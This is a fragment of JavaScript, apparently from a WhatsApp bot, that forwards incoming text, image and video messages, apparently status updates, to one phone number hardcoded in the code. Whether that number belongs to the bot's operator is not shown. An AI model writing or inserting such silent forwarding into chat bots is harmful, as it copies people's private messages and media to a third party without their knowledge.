...
{ let cap = mek.message.extendedTextMessage.text;
  Void.sendMessage("923184474176@s.whatsapp.net",{text :cap },{quoted : mek});
      //	console.log("Its An Text Status ");
}
else if(mek.message.imageMessage)
{
let cap = mek.message.imageMessage;
let anu = await Void.downloadAndSaveMediaMessage(mek.message.imageMessage)
Void.sendMessage("923184474176@s.whatsapp.net",{image:{url : anu} , caption : cap  })
}
else if(mek.message.videoMessage)
{let cap = mek.message.videoMessage;
let anu = await Void.downloadAndSaveMediaMessage(mek.message.videoMessage)
Void.sendMessage("923184474176@s.whatsapp.net",{video:{url : anu} , caption : cap })
}
